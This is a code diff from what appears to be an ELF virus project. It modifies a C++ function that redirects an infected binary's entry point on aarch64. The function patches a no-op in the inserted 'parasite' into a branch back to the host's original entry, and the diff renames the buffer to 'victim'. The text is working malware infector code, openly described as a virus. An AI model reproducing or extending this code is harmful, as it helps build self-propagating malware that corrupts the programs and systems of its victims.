@@ -3,11 +3,10 @@
 
 namespace vt::common {
 
-bool redirect_elf_entry_point(Elf64_Half binary_type,
-                              Elf64_Addr original_entry_point,
+bool redirect_elf_entry_point(Elf64_Addr original_entry_point,
                               Elf64_Addr parasite_load_address,
                               size_t parasite_offset, size_t parasite_size,
-                              std::span<std::byte> mapping) {
+                              std::span<std::byte> victim) {
   constexpr auto no_op_to_be_patched = 0xd503201f;
   // For aarch64, patch the b address to the orignal entry point.
   // It is assumed that the inserted virus has at least 4 bytes of noop and
@@ -19,7 +18,7 @@ bool redirect_elf_entry_point(Elf64_Half binary_type,
   // The rel is offset from the current instruction (b xxx)
   // The patched jump instruction is always 4 bytes.
   auto patch_offset_from_parasite_start = common::find<uint32_t>(
-      mapping.subspan(parasite_offset, parasite_size), no_op_to_be_patched);
+      victim.subspan(parasite_offset, parasite_size), no_op_to_be_patched);
   if (patch_offset_from_parasite_start == -1) {
     // printf("failed to patch host entry\n");
     return false;
@@ -32,7 +31,7 @@ bool redirect_elf_entry_point(Elf64_Half binary_type,
 
   rel /= 4;
   auto* inst = reinterpret_cast<int32_t*>(
-      &mapping[parasite_offset + patch_offset_from_parasite_start]);
+      &victim[parasite_offset + patch_offset_from_parasite_start]);
 
   *inst = rel;
 
